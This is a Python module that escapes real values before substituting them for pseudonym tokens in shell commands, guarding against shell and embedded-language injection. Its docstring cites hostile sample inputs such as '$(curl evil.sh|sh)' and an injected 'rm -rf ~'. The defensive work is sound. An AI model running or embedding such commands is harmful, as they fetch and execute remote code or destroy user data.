"""Context-aware rehydration for shell commands.

Rehydrating a token into a Bash command turns *data* into *code*: a customer
whose display name is `$(curl evil.sh|sh)` or `x"; rm -rf ~; "` would be
executed, and even `O'Brien` breaks an SQL literal. So each token is replaced
with its real value escaped for every language layer it sits in, innermost first:

  1. the embedded language, when the shell word or heredoc is code for an
     interpreter (`python -c`, `node -e`, `ruby -e`, `perl -e`, `php -r`, `jq`,
     `awk`, `mongosh --eval`, SQL clients, `bash -c` / `eval`, or a heredoc fed to
     one of them): escaped for the string literal it is in (Python f/r/b prefixes,
     JS template literals, Ruby `#{}`, Perl `$@`, SQL quote doubling). A token in
     *code* position (not inside a literal) is restored only if the value is
     inert there (letters, digits, `_.@+-`); otherwise the token stays.
  2. the shell quoting at that spot: unquoted, '...', "...", $'...', backticks,
     $(...) (a fresh context), heredoc bodies (quoted delimiter: literal;
     unquoted: \\ $ ` are special; a value with a newline could end the body).

If a value cannot be represented safely (a quote inside a Python raw string, a
newline in a heredoc), the token is left in place: the command fails to find
data rather than running something nobody wrote.
"""

from __future__ import annotations

import json
import os
import re
import shlex
from dataclasses import dataclass, field

NONE, SQ, DQ, AQ, BQ, HQ, HU = "none", "single", "double", "ansi", "backtick", "heredoc", "heredoc-expand"
SAFE_CODE = re.compile(r"[\w.@+-]+")
BACKTICK_SAFE = re.compile(r"[\w.@+ -]+")
EXPANSION = re.compile(r"\$[A-Za-z_{(@*0-9]|`")  # parameter expansion or command substitution
DYNAMIC = re.compile(r"\$\(|`")
_BLANK = " \t"
_OPS = ";&|()<>"


@dataclass
class Word:
    start: int
    end: int = 0
    content: list[str] = field(default_factory=list)   # the word after shell unquoting
    cmap: list[int] = field(default_factory=list)       # content index -> command index
    double: bool = False                                # had a "..." part

    @property
    def text(self) -> str:
        return "".join(self.content)


@dataclass
class Unit:
    """A run of code for an embedded language: a shell word or a heredoc body."""
    lang: str
    text: str
    cmap: list[int]
    span: tuple[int, int] = (0, 0)  # command range, including parts not in cmap ($( ) inside the word)
    seg: int = -1


class Scan:
    """One pass over a command: the shell state of every character (innermost
    context), the words of every simple command (at every nesting level), and
    heredoc bodies with the command that reads them."""

    def __init__(self, command: str):
        self.cmd = command
        self.state: list[str] = [NONE] * len(command)
        self.in_backticks: list[bool] = [False] * len(command)
        self.frame_at: list[int] = [0] * len(command)        # substitution frame of each char (0 = top)
        self.frame_info: dict[int, tuple[Word, int]] = {}    # frame -> (word its output lands in, parent)
        self.segments: list[list[Word]] = []
        self.ops: list[str] = []          # operator that ended each segment ("|" = piped onward)
        self.frames: list[int] = []       # nesting frame of each segment (pipes link within one)
        self.heredocs: list[tuple[Unit, list[Word], bool]] = []  # body, reading command, expanding
        self._scan()
        seg_of = {id(seg): k for k, seg in enumerate(self.segments)}
        self.word_seg = {id(w): k for k, seg in enumerate(self.segments) for w in seg}
        for body, owner, _ in self.heredocs:
            body.seg = seg_of.get(id(owner), -1)

    # -- scanning ------------------------------------------------------------
    def _scan(self) -> None:
        cmd, n = self.cmd, len(self.cmd)
        # frame: [kind, words of the current segment, current word, paren depth, outer mode, id]
        stack: list[list] = [["top", [], None, 0, NONE, 0]]
        frame_ids = iter(range(1, 1 << 30))
        pending: list[tuple[str, bool, bool, list[Word]]] = []  # delimiter, quoted, strip tabs, owner
        mode = NONE  # quoting mode inside the innermost frame
        i = 0

        def word() -> Word:
            f = stack[-1]
            if f[2] is None:
                f[2] = Word(i)
            return f[2]

        def end_word() -> None:
            f = stack[-1]
            if f[2] is not None:
                f[2].end = i
                f[1].append(f[2])
                f[2] = None

        def end_segment(op: str = "") -> None:
            end_word()
            f = stack[-1]
            if f[1]:
                self.segments.append(f[1])
                self.ops.append(op)
                self.frames.append(f[5])
                f[1] = []

        def content(ch: str, at: int) -> None:
            w = word()
            w.content.append(ch)
            w.cmap.append(at)

        while i < n:
            c = cmd[i]
            frame = stack[-1]
            self.in_backticks[i] = any(f[0] == "backtick" for f in stack)
            self.frame_at[i] = frame[5]
            nested_none = frame[0] in ("subst", "backtick")
            st = BQ if frame[0] == "backtick" and mode == NONE else mode
            if mode == SQ:
                self.state[i] = SQ
                if c == "'":
                    mode = NONE
                else:
                    content(c, i)
                i += 1
                continue
            if mode == AQ:
                self.state[i] = AQ
                if c == "\\" and i + 1 < n:
                    self.state[i + 1] = AQ
                    i += 2
                    continue
                if c == "'":
                    mode = NONE
                else:
                    content(c, i)
                i += 1
                continue
            # NONE or DQ (possibly inside $( ) or backticks)
            self.state[i] = st if mode == NONE else DQ
            if c == "\\" and i + 1 < n:
                if mode == DQ and cmd[i + 1] not in '$`"\\\n':
                    content(c, i)
                    i += 1
                    continue
                self.state[i + 1] = self.state[i]
                if cmd[i + 1] != "\n":
                    content(cmd[i + 1], i + 1)
                i += 2
                continue
            if c == "$" and cmd.startswith("$(", i):
                outer = word()  # the substitution is part of the current word, its output unknown
                stack.append(["subst", [], None, 1, mode, next(frame_ids)])
                self.frame_info[stack[-1][5]] = (outer, frame[5])
                mode = NONE
                i += 2
                continue
            if c == "`":
                if frame[0] == "backtick":
                    end_segment()
                    stack.pop()
                    mode = frame[4]
                else:
                    outer = word()
                    stack.append(["backtick", [], None, 0, mode, next(frame_ids)])
                    self.frame_info[stack[-1][5]] = (outer, frame[5])
                    mode = NONE
                i += 1
                continue
            if mode == DQ:
                if c == '"':
                    mode = NONE
                else:
                    content(c, i)
                i += 1
                continue
            # mode NONE
            if c == "$" and cmd.startswith("$'", i):
                word()
                mode = AQ
                self.state[i + 1] = AQ
                i += 2
                continue
            if c == "'":
                word()
                mode = SQ
                i += 1
                continue
            if c == '"':
                word().double = True
                mode = DQ
                i += 1
                continue
            if c == "#" and frame[2] is None:  # comment to end of line
                j = cmd.find("\n", i)
                j = n if j < 0 else j
                for k in range(i, j):
                    self.state[k] = st
                i = j
                continue
            if c == "(" and frame[0] == "subst":
                frame[3] += 1
            if c == ")" and frame[0] == "subst":
                frame[3] -= 1
                if frame[3] == 0:
                    end_segment()
                    stack.pop()
                    mode = frame[4]
                    i += 1
                    continue
            if c == "<" and cmd.startswith("<<", i) and not cmd.startswith("<<<", i):
                end_word()
                j = i + 2
                strip = j < n and cmd[j] == "-"
                j += strip
                while j < n and cmd[j] in _BLANK:
                    j += 1
                delim, quoted = [], False
                while j < n and cmd[j] not in _BLANK + "\n" + _OPS:
                    if cmd[j] in "'\"":
                        q, quoted = cmd[j], True
                        k = cmd.find(q, j + 1)
                        k = n if k < 0 else k
                        delim.append(cmd[j + 1:k])
                        j = k + 1
                    elif cmd[j] == "\\" and j + 1 < n:
                        quoted = True
                        delim.append(cmd[j + 1])
                        j += 2
                    else:
                        delim.append(cmd[j])
                        j += 1
                for k in range(i, j):
                    self.state[k] = st
                pending.append(("".join(delim), quoted, strip, frame[1], self.in_backticks[i]))
                i = j
                continue
            if c == "\n":
                self.state[i] = st
                end_segment()
                i += 1
                for delim, quoted, strip, owner, bq in pending:
                    i = self._heredoc(i, delim, quoted, strip, owner, bq)
                pending.clear()
                continue
            if c in _BLANK:
                end_word()
                i += 1
                continue
            if c in _OPS:
                op = c
                if cmd.startswith(("||", "&&"), i):
                    op = cmd[i:i + 2]
                    i += 1
                elif cmd.startswith("|&", i):
                    i += 1
                if c in ";&|()" and not nested_none or c in ";&|":
                    end_segment(op)
                else:
                    end_word()
                i += 1
                continue
            content(c, i)
            i += 1
        while stack:
            end_segment()
            stack.pop()

    def _heredoc(self, i: int, delim: str, quoted: bool, strip: bool, owner: list[Word], bq: bool) -> int:
        cmd, n = self.cmd, len(self.cmd)
        start = i
        while i <= n:
            j = cmd.find("\n", i)
            j = n if j < 0 else j
            line = cmd[i:j]
            if (line.lstrip("\t") if strip else line) == delim:
                for k in range(i, j):
                    self.state[k] = NONE
                end = i
                i = min(j + 1, n)
                break
            i = j + 1
        else:
            end = n
        for k in range(start, end):
            self.state[k] = HQ if quoted else HU
            self.in_backticks[k] = bq
        body = cmd[start:end]
        self.heredocs.append((Unit("", body, list(range(start, end)), (start, end)), owner, not quoted))
        return i if i <= n else n

    # -- which words are code ------------------------------------------------
    def units(self) -> list[Unit]:
        out = []
        for k, seg in enumerate(self.segments):
            for u in _code_units(seg):
                u.seg = k
                out.append(u)
        for body, owner, _ in self.heredocs:
            lang = _stdin_lang(owner)
            if lang:
                out.append(Unit(lang, body.text, body.cmap, body.span, body.seg))
        return out

    def segment_at(self, i: int) -> int:
        w = self.word_at(i)
        if w is not None:
            return self.word_seg[id(w)]
        for body, _, _ in self.heredocs:
            if body.span[0] <= i < body.span[1]:
                return body.seg
        return -1

    def heredoc_at(self, i: int):
        for body, _, expanding in self.heredocs:
            if body.span[0] <= i < body.span[1]:
                return body, expanding
        return None, False

    def downstream(self, seg: int) -> list[int]:
        """Segments that receive this one's output through pipes."""
        out = []
        while 0 <= seg < len(self.ops) and self.ops[seg] == "|":
            nxt = next((j for j in range(seg + 1, len(self.segments)) if self.frames[j] == self.frames[seg]), None)
            if nxt is None:
                break
            out.append(nxt)
            seg = nxt
        return out

    def word_at(self, i: int) -> Word | None:
        for seg in self.segments:
            for w in seg:
                if w.start <= i < w.end and i in w.cmap:
                    return w
        return None


# -- interpreters ----------------------------------------------------------

def _name(w: Word) -> str:
    return os.path.basename(w.text)


PY = re.compile(r"(?:python|pypy)[0-9.]*")
FLAG_CODE = {  # interpreter -> (language, flags whose next word is code, --long= prefixes)
    "node": ("js", {"-e", "--eval", "-p", "--print"}, ("--eval=", "--print=")),
    "nodejs": ("js", {"-e", "--eval", "-p", "--print"}, ("--eval=",)),
    "bun": ("js", {"-e", "--eval", "-p", "--print"}, ("--eval=",)),
    "mongosh": ("js", {"--eval"}, ("--eval=",)),
    "mongo": ("js", {"--eval"}, ("--eval=",)),
    "ruby": ("ruby", {"-e"}, ()),
    "php": ("php", {"-r"}, ()),
    "psql": ("sql", {"-c", "--command"}, ("--command=",)),
    "mysql": ("mysql", {"-e", "--execute"}, ("--execute=",)),
    "mariadb": ("mysql", {"-e", "--execute"}, ("--execute=",)),
    "clickhouse-client": ("sql", {"-q", "--query"}, ("--query=",)),
    "sqlcmd": ("sql", {"-Q", "-q"}, ()),
}
SHELLS = {"sh", "bash", "zsh", "dash", "ksh", "ash"}
STDIN_LANG = {"node": "js", "nodejs": "js", "bun": "js", "deno": "js", "mongosh": "js", "ruby": "ruby",
              "perl": "perl", "php": "php", "psql": "sql", "sqlite3": "sql", "duckdb": "sql", "mysql": "mysql",
              "mariadb": "mysql", "clickhouse-client": "sql", **{s: "sh" for s in SHELLS}}


def _wunit(lang: str, w: Word) -> Unit:
    return Unit(lang, w.text, w.cmap, (w.start, w.end))


def _code_units(seg: list[Word]) -> list[Unit]:
    out = []
    i = 0
    while i < len(seg):
        name, rest = _name(seg[i]), seg[i + 1:]
        lang = None
        if PY.fullmatch(name):
            lang, flags = "python", {"-c"}
            longs = ()
        elif name in FLAG_CODE:
            lang, flags, longs = FLAG_CODE[name]
        elif name == "perl":
            lang, flags, longs = "perl", None, ()
        elif name in SHELLS:
            lang, flags, longs = "sh", None, ()
        if lang:
            for k, w in enumerate(rest):
                t = w.text
                if flags is None and t.startswith("-") and not t.startswith("--") and \
                        (t.endswith("c") if lang == "sh" else t[-1:] in "eE"):
                    if k + 1 < len(rest):  # -c, -lc, -ec / -e, -ne, -lpe
                        out.append(_wunit(lang, rest[k + 1]))
                    break
                if flags is not None and t in flags:
                    if k + 1 < len(rest):
                        out.append(_wunit(lang, rest[k + 1]))
                    break
                for p in longs:
                    if t.startswith(p):
                        out.append(Unit(lang, t[len(p):], w.cmap[len(p):], (w.start, w.end)))
                if not t.startswith("-"):
                    if lang != "sh" and name not in ("psql", "mysql", "mariadb", "sqlcmd", "clickhouse-client"):
                        break  # `python script.py -c x`: -c belongs to the script
            i += 1
            continue
        if name == "deno" and rest and rest[0].text == "eval" and len(rest) > 1:
            out.append(_wunit("js", rest[1]))
        elif name == "eval" and rest:  # eval joins its arguments with spaces and parses the result
            text, cmap = [], []
            for w in rest:
                if text:
                    text.append(" ")
                    cmap.append(w.start - 1)
                text += w.content
                cmap += w.cmap
            out.append(Unit("sh", "".join(text), cmap, (rest[0].start, rest[-1].end)))
        elif name in ("jq", "gojq"):
            skip = {"--arg": 2, "--argjson": 2, "--slurpfile": 2, "--rawfile": 2, "--indent": 1, "-L": 1}
            k = 0
            while k < len(rest):
                t = rest[k].text
                if t in skip:
                    k += skip[t] + 1
                elif t.startswith("-") and t != "-":
                    k += 1
                else:
                    out.append(_wunit("jq", rest[k]))
                    break
        elif name in ("awk", "gawk", "mawk", "nawk"):
            k = 0
            while k < len(rest):
                t = rest[k].text
                if t in ("-F", "-v"):
                    k += 2
                elif t == "-f":
                    break  # program from a file
                elif t.startswith("-"):
                    k += 1
                else:
                    out.append(_wunit("awk", rest[k]))
                    break
        elif name in ("sqlite3", "duckdb"):
            pos = [w for w in rest if not w.text.startswith("-")]
            out += [_wunit("sql", w) for w in pos[1:]]
        i += 1
    return out


WRAPPERS = {"sudo", "env", "exec", "command", "time", "nohup", "nice", "stdbuf", "timeout", "builtin", "eval",
            "xargs", "doas", "chronic", "unbuffer"}


def _command_position(seg: list[Word], word: Word) -> bool:
    """Is this word (or what it expands to) run as a command?"""
    for w in seg:
        if w is word:
            return True
        t = w.text
        if re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*=.*", t, re.S) or t.startswith("-") or _name(w) in WRAPPERS \
                or t.isdigit():
            continue
        return False
    return False


def _consumer(seg: list[Word], has_inline_code: bool) -> str | None:
    """The language a piped-in stream becomes in this command, if any."""
    names = [_name(w) for w in seg]
    if names and names[0] in ("xargs", "parallel"):  # input becomes arguments; code only via -I or a shell
        rest = names[1:]
        risky = any(PY.fullmatch(x) or x in STDIN_LANG or x == "eval" for x in rest) or \
            any(x.startswith(("-I", "-i", "-J", "--replace")) for x in rest)
        return "sh" if risky else None
    if has_inline_code:
        return None  # `python3 -c CODE` reads data, not code, from stdin
    if len(names) >= 2 and names[0] in ("source", ".") and names[1] in ("/dev/stdin", "-"):
        return "sh"
    return _stdin_lang(seg)


def _stdin_lang(owner: list[Word]) -> str | None:
    for w in owner:
        name = _name(w)
        if PY.fullmatch(name):
            return "python"
        if name in STDIN_LANG:
            return STDIN_LANG[name]
    return None


# -- embedded languages ------------------------------------------------------

LANG_QUOTES = {"python": "'\"", "js": "'\"`", "ruby": "'\"", "perl": "'\"", "php": "'\"",
               "jq": '"', "awk": '"', "sql": "'\"", "mysql": "'\"", "json": '"'}
BLOCK_COMMENT_LANGS = {"js", "php", "sql", "mysql"}
LINE_COMMENT = {"python": "#", "ruby": "#", "perl": "#", "jq": "#", "awk": "#", "sql": "--", "mysql": "--",
                "js": "//", "php": "//"}


def literal_contexts(lang: str, text: str, comments: bool = False) -> list[tuple[str, str] | None]:
    """Per character: (quote, prefix) when inside a string literal, else None.
    With comments=True, comment characters are ("#", "line") or ("/*", "block")."""
    quotes, comment = LANG_QUOTES[lang], LINE_COMMENT.get(lang)
    backslash = lang not in ("sql",)
    out: list[tuple[str, str] | None] = [None] * len(text)
    i, n = 0, len(text)
    while i < n:
        c = text[i]
        if comment and text.startswith(comment, i):
            j = text.find("\n", i)
            j = n if j < 0 else j
            if comments:
                out[i:j] = [("#", "line")] * (j - i)
            i = j
            continue
        if lang in BLOCK_COMMENT_LANGS and text.startswith("/*", i):
            j = text.find("*/", i + 2)
            j = n if j < 0 else j + 2
            if comments:
                out[i:j] = [("/*", "block")] * (j - i)
            i = j
            continue
        if c in quotes:
            q = c * 3 if lang == "python" and text.startswith(c * 3, i) else c
            prefix = ""
            if lang == "python":
                k = i
                while k > 0 and text[k - 1] in "rRbBfFuU":
                    k -= 1
                prefix = text[k:i].lower()
            j = i + len(q)
            while j < n and not text.startswith(q, j):
                if backslash and text[j] == "\\" and "r" not in prefix:
                    out[j] = (q, prefix)
                    j += 1
                if j < n:
                    out[j] = (q, prefix)
                j += 1
            i = j + len(q)
            continue
        i += 1
    return out


def escape_literal(value: str, lang: str, quote: str, prefix: str) -> str | None:
    q = quote[0]
    if lang == "python":
        if "r" in prefix:
            return None if any(ch in value for ch in (q, "\\", "\n", "\r")) else value
        if "b" in prefix and not value.isascii():
            return None
        v = value.replace("\\", "\\\\").replace(q, "\\" + q).replace("\n", "\\n").replace("\r", "\\r")
        return v.replace("{", "{{").replace("}", "}}") if "f" in prefix else v
    if lang == "js":
        v = value.replace("\\", "\\\\").replace(q, "\\" + q).replace("\n", "\\n").replace("\r", "\\r")
        return v.replace("${", "\\${") if q == "`" else v
    if lang in ("ruby", "perl", "php"):
        if q == "'":
            return value.replace("\\", "\\\\").replace("'", "\\'")
        special = {"ruby": '\\"#', "perl": '\\"$@', "php": '\\"$'}[lang]
        return "".join("\\" + ch if ch in special else ch for ch in value).replace("\n", "\\n")
    if lang in ("jq", "json"):
        return json.dumps(value, ensure_ascii=False)[1:-1]
    if lang == "awk":
        return value.replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n")
    if lang in ("sql", "mysql"):
        v = value.replace(q, q + q)
        return v.replace("\\", "\\\\") if lang == "mysql" else v
    return None


def escape_shell(value: str, state: str) -> str | None:
    if state == NONE:
        return shlex.quote(value) if value and any(not (c.isalnum() or c in "@%+=:,./-_") for c in value) \
            else value
    if state == SQ:
        return value.replace("'", "'\\''")
    if state == DQ:
        return "".join("\\" + c if c in '\\"$`' else c for c in value)
    if state == AQ:
        return value.replace("\\", "\\\\").replace("'", "\\'")
    if state == BQ:  # backslashes before \ ` $ are removed before the inner command is parsed
        return shlex.quote(value).replace("\\", "\\\\").replace("`", "\\`").replace("$", "\\$")
    if state == HQ:
        return None if "\n" in value or "\r" in value else value
    if state == HU:
        if "\n" in value or "\r" in value:
            return None
        return "".join("\\" + c if c in "\\$`" else c for c in value)
    return None


class Escaper:
    """Escape values for positions in one command (the analysis is done once)."""

    def __init__(self, command: str, depth: int = 0):
        self.scan = Scan(command)
        self.depth = depth
        units = self.scan.units()
        self._units = [(u, literal_contexts(u.lang, u.text) if u.lang in LANG_QUOTES else None) for u in units]
        has_code = {u.seg for u in units}  # reads its code from an argument or heredoc, not the pipe
        self.consumers = [_consumer(seg, k in has_code) for k, seg in enumerate(self.scan.segments)]
        # Values can reach code indirectly: `x=VALUE; python3 -c "...$x..."`, a heredoc that
        # expands $x into code. Then every value outside a code literal must be inert.
        self.tainted = any(EXPANSION.search(u.text) for u in units if u.lang) or \
            any(EXPANSION.search(b.text) for b, owner, expanding in self.scan.heredocs if expanding and _stdin_lang(owner))

    def _unit_at(self, i: int):
        for u, ctx in self._units:
            if u.cmap and u.cmap[0] <= i <= u.cmap[-1]:
                try:
                    return u, ctx, u.cmap.index(i)
                except ValueError:
                    continue
        return None, None, None

    def _in_dynamic_part(self, i: int) -> bool:
        """Inside a $( ) or `...` whose output lands in code (`eval x $(printf %s VALUE)`)."""
        return any(u.span[0] <= i < u.span[1] and i not in u.cmap for u, _ in self._units if u.lang)

    def _output_reaches_code(self, i: int) -> bool:
        """Is `i` inside a $( ) / `...` whose output is executed: in command position
        (`$(printf %s VALUE)`), or piped into an interpreter, at any nesting level?"""
        scan, f = self.scan, self.scan.frame_at[i] if i < len(self.scan.frame_at) else 0
        while f:
            outer, parent = scan.frame_info[f]
            seg = scan.word_seg.get(id(outer))
            if seg is not None:
                if _command_position(scan.segments[seg], outer):
                    return True
                if any(self.consumers[j] for j in scan.downstream(seg)):
                    return True
            f = parent
        return False

    def escape(self, start: int, end: int, value: str) -> str | None:
        scan = self.scan
        state = scan.state[start] if start < len(scan.state) else NONE
        if any(scan.state[k] != state for k in range(start, min(end, len(scan.state)))):
            return None  # a token split across quoting: don't guess
        if scan.in_backticks[start] and not BACKTICK_SAFE.fullmatch(value):
            return None  # legacy `...`: backslash rules differ by surrounding quotes; don't risk it
        inert = SAFE_CODE.fullmatch(value) is not None
        body, expanding = scan.heredoc_at(start)
        if body is not None and expanding and DYNAMIC.search(body.text) and not BACKTICK_SAFE.fullmatch(value):
            return None  # an unquoted heredoc with substitutions re-evaluates its text
        if not inert and (self._in_dynamic_part(start) or self._output_reaches_code(start)):
            return None
        unit, ctx, at = self._unit_at(start)
        inner, in_literal = value, False
        if unit is not None and unit.lang:
            if unit.lang == "sh":
                if self.depth >= 3:
                    return None
                last = unit.cmap.index(end - 1) if end - 1 in unit.cmap else at + (end - start) - 1
                inner = Escaper(unit.text, self.depth + 1).escape(at, last + 1, value)
            elif ctx is not None:
                lit = ctx[at]
                in_literal = bool(lit)
                inner = escape_literal(value, unit.lang, *lit) if lit else (value if inert else None)
            if inner is None:
                return None
        # `x=VALUE; python3 -c "...$x..."`: values reach code through variables
        if self.tainted and not in_literal and not inert:
            return None
        down = [self.consumers[j] for j in scan.downstream(scan.segment_at(start))]
        if any(down):
            # piped into an interpreter: the printed text becomes code. Only an SQL client
            # reading a value inside an SQL '...' literal is handled; otherwise inert values only.
            if unit is None and down[0] in ("sql", "mysql") and self._sql_literal(start, body):
                inner = escape_literal(value, down[0], "'", "")
            elif not inert:
                return None
        elif unit is None and state == DQ:
            # An unknown tool with an SQL-looking literal in a "..." argument
            # (`docker exec db sqlite3 /data/app.db "... = 'TOKEN'"`): double quotes as SQL.
            w = scan.word_at(start)
            if w is not None and w.double and self._sql_literal(start, None):
                inner = escape_literal(value, "sql", "'", "")
        return escape_shell(inner, state)

    def _sql_literal(self, i: int, body) -> bool:
        if body is not None:
            text, k = body.text, body.cmap.index(i)
        else:
            w = self.scan.word_at(i)
            if w is None:
                return False
            text, k = w.text, w.cmap.index(i)
        lit = literal_contexts("sql", text)[k]
        return bool(lit) and lit[0] == "'"


def rehydrate_command(veil, command: str, only=None) -> str:
    """Replace tokens in a shell command with real values escaped for their context."""
    pattern = veil.token_pattern()
    if pattern is None:
        return command
    allowed = set(only) if only is not None else None
    escaper = None
    out, pos = [], 0
    for m in pattern.finditer(command):
        tok = m.group()
        value = veil.vault.value_for(tok)
        if value is None or (allowed is not None and tok not in allowed):
            continue
        escaper = escaper or Escaper(command)
        safe = escaper.escape(m.start(), m.end(), value)
        if safe is None:
            continue  # cannot be represented safely here: leave the pseudonym
        out += [command[pos:m.start()], safe]
        pos = m.end()
    out.append(command[pos:])
    return "".join(out)
